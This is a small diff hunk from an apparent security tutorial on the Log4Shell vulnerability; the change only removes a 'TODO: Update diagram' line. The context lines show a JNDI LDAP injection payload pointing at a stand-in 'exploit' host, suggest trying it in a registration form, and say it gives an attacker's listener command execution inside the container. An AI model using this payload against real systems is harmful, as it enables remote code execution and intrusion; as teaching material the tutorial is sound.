@@ -309,7 +309,6 @@ ${jndi:ldap://exploit:1389/Exploit}
 
 which needs to be passed into the Log4j logging library. What parameters were logged?  Could we try this in our registration form?
 
-> TODO: Update diagram
 <img width="982" alt="Screen Shot 2022-09-01 at 12 07 38 pm" src="https://user-images.githubusercontent.com/49122574/187829554-16548070-c060-4950-90e4-a983341e4e43.png">
 
 The exploit will connect to our attackers machine we call the `listener`.  This will allow us to execute commands as if we were inside the application container.
